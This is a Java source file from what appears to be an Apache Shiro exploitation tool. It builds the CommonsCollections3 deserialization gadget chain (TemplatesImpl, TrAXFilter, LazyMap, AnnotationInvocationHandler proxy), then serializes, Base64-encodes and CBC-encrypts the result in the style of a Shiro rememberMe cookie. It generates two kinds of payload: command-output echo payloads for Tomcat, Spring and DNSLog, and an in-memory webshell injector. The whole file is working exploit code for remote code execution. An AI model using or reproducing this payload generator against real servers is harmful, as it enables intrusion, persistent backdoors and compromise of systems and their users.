package com.y5neko.shiroexp.gadget;

import com.y5neko.shiroexp.echo.*;
import com.y5neko.shiroexp.payloads.MemshellLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.y5neko.shiroexp.misc.Tools;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * CommonsCollections3 利用链
 * 使用 InstantiateTransformer + TrAXFilter + 动态代理组合
 */
public class CommonsCollections3 {

    /**
     * 反射设置字段值
     */
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * 构造 CC3 链 payload
     * @param templatesImpl TemplatesImpl 对象
     * @return 反序列化 payload
     */
    private Object getObject(TemplatesImpl templatesImpl) throws Exception {
        // 创建初始的 dummy ChainedTransformer（避免序列化时触发）
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });

        // 创建真实的 transformer 链（通过 InstantiateTransformer 实例化 TrAXFilter）
        Transformer[] transformers = new Transformer[]{
                // 1. 返回 TrAXFilter.class
                new ConstantTransformer(TrAXFilter.class),
                // 2. 实例化 TrAXFilter，其构造函数会调用 templatesImpl.newTransformer()
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templatesImpl}
                )
        };

        // 创建 LazyMap
        Map<Object, Object> innerMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(innerMap, (Transformer) chainedTransformer);

        // 创建动态代理
        Map mapProxy = (Map) Proxy.newProxyInstance(
                CommonsCollections3.class.getClassLoader(),
                new Class[]{Map.class},
                createMemoizedInvocationHandler(lazyMap)
        );

        // 通过反射修改 chainedTransformer 的 iTransformers 为真实的 transformer 数组
        setFieldValue(chainedTransformer, "iTransformers", transformers);

        // 返回 AnnotationInvocationHandler 对象
        return createMemoizedInvocationHandler(mapProxy);
    }

    /**
     * 创建 MemoizedInvocationHandler
     * 使用 sun.reflect.annotation.AnnotationInvocationHandler
     */
    private static InvocationHandler createMemoizedInvocationHandler(Map mapProxy) throws Exception {
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        return (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
    }

    /**
     * 生成回显 payload
     * @param echoType 回显类型
     * @param key 密钥
     * @return 加密后的 payload 字符串
     */
    public static String genEchoPayload(String echoType, String key) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 根据回显类型生成恶意类
        if (echoType.equals("TomcatEcho")) {
            TomcatEcho tomcatEcho = new TomcatEcho();
            ctClass = tomcatEcho.genPayload(pool);
        } else if (echoType.equals("SpringEcho")) {
            SpringEcho springEcho = new SpringEcho();
            ctClass = springEcho.genPayload(pool);
        } else if (echoType.equals("AllEcho")) {
            AllEcho allEcho = new AllEcho();
            ctClass = allEcho.genPayload(pool);
        } else if (echoType.equals("DNSLogEcho")) {
            // DNSLog 探测
            DNSLogEcho dnsLogEcho = new DNSLogEcho();
            ctClass = dnsLogEcho.genPayload(pool);
        } else {
            throw new Exception("不支持的回显类型: " + echoType);
        }

        // 设置父类为 AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        // 创建 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 生成反序列化 payload
        Object payload = new CommonsCollections3().getObject(templatesImpl);

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(payload);
        oos.close();

        String data = Base64.getEncoder().encodeToString(baos.toByteArray());
        return Tools.CBC_Encrypt(key, data);
    }

    /**
     * 生成内存马 payload
     * @param key 密钥
     * @return 加密后的 payload 字符串
     */
    public static String genMemPayload(String key) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 使用 MemshellLoader 作为内存马注入器
        MemshellLoader memshellLoader = new MemshellLoader();
        ctClass = memshellLoader.genPayload(pool);

        // 设置父类为 AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        // 创建 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 生成反序列化 payload
        Object payload = new CommonsCollections3().getObject(templatesImpl);

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(payload);
        oos.close();

        String data = Base64.getEncoder().encodeToString(baos.toByteArray());
        return Tools.CBC_Encrypt(key, data);
    }
}
